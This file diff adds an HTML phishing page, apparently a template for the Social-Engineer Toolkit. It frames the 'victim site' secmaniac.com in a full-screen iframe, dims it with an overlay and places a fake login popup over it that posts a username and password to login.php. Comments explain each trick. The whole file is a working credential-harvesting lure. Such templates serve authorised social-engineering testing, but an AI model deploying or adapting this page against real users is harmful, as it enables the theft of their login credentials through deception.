@@ -1,0 +1,81 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>SecManiac</title>
+
+<style type="text/css">
+/* Make an iframe large enough to fill the browser screen */
+iframe {
+  margin: 0px;
+  padding: 0px;
+  width: 100%;
+  height: 2000px;
+}
+
+body {
+  margin: 0px;
+  padding: 0px;
+}
+
+/* Make a see through, grey background to fill the browser screen */
+#bg {
+  background-color: #111111;
+  opacity: 0.65;
+  filter: alpha(opacity=65);
+  position: absolute;
+  z-index: 9000;
+  top: 0px;
+  left: 0px;
+  width: 100%;
+  height: 2000px;
+}
+
+/* Make the login form look like a popup */
+#login {
+  padding: 16px;
+  position: absolute;
+  top: 40px;
+  left: 40px;
+  background-color: #eeeeee;
+  width: 300px;
+  z-index: 10000;
+  text-align: left;
+  border: 2px solid #000000;
+}
+
+input {
+  background-color: #eeeeee;
+  color: #000000;
+  border: 1px solid #000000;
+  font-family: arial, verdana, ms sans serif;
+  font-weight: regular;
+  font-size: 12pt
+}
+</style>
+</head>
+
+<body>
+<!-- Import the victim site in an iframe -->
+<iframe src="http://www.secmaniac.com" ></iframe>
+
+<!-- Add the background to give the popup effect -->
+<div id="bg"></div>
+
+<!-- Create the login box -->
+<div id="login">
+<p>Login to the new SecManiac.com web site.</p>
+
+<!-- The action on the form is not important, but the method should be POST -->
+<form action="login.php" method="POST">
+<table border="0" cellpadding="1" cellspacing="1">
+
+<!-- SET wants inputs named username and password -->
+<tr><td>Username: </td><td><input type="text" name="username" /></td></tr>
+<tr><td>Password: </td><td><input type="password" name="password" /></td></tr>
+<tr><td colspan="2"><input type="submit" value="Login" /></td></tr>
+</table>
+</form>
+</div>
+
+</body>
+</html>
